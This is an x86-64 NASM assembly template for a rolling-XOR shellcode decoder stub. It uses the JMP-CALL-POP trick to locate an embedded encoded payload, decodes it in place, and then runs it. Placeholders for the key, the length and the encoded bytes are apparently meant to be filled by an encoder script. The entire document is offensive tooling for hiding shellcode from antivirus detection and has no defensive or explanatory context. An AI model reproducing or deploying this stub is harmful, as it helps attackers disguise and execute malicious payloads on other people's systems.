BITS 64

KEY equ '%s'
LEN equ %s
global _start:
section .text

_start:
    jmp _get_pointer

_decode:
    pop rdi ; rdi points to encodedshellcode

    push KEY
    pop rsi
    xor rax, rax
    xor rcx, rcx
    cdq

_loop:
    
    cmp rcx, LEN
    jg EncodedShellcode

    mov al, [rdi] 
    xor al, sil
    mov sil, [rdi]
    mov [rdi], al


    inc rdi
    inc rcx
    jmp _loop

_get_pointer:
    call _decode
    EncodedShellcode: db %s
